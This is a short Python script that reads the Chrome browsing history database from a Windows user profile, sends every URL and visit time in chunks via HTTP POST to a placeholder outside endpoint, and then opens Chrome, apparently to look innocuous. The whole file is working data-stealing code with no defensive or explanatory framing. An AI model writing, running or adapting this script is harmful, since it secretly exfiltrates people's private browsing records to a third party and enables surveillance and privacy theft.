import requests
import os
import psutil
import sqlite3
import time

# Function to get Chrome's history data
def get_chrome_history():
    # Path to the Chrome history file
    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    
    if not os.path.exists(history_path):
        print("Chrome history not found.")
        return None

    # Connect to the Chrome history database
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()

    # Query to get URLs and the corresponding visit times
    cursor.execute("SELECT urls.url, visits.visit_time FROM urls, visits WHERE urls.id = visits.url")
    
    history_data = []
    for row in cursor.fetchall():
        url = row[0]
        visit_time = row[1]
        history_data.append(f"URL: {url}, Visited: {visit_time}")
    
    conn.close()

    return history_data

# Function to send the data (limit the size)
def send_data(data):
    chunk_size = 2000  # Maximum allowed length
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        payload = {'content': chunk}
        
        # Send data via POST request
        response = requests.post("https://your_api_endpoint.com", data=payload)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
            print(response.text)

# Main function
def main():
    print("Starting process...")
    
    # Get Chrome history
    history_data = get_chrome_history()
    
    if history_data:
        # Join the history data into one large string
        history_str = "\n".join(history_data)
        
        # Send data in smaller chunks
        send_data(history_str)
    
    else:
        print("No history data found or could not retrieve it.")
    
    # Wait for 3 seconds before opening Google Chrome
    time.sleep(3)
    os.system("start chrome")

if __name__ == "__main__":
    main()
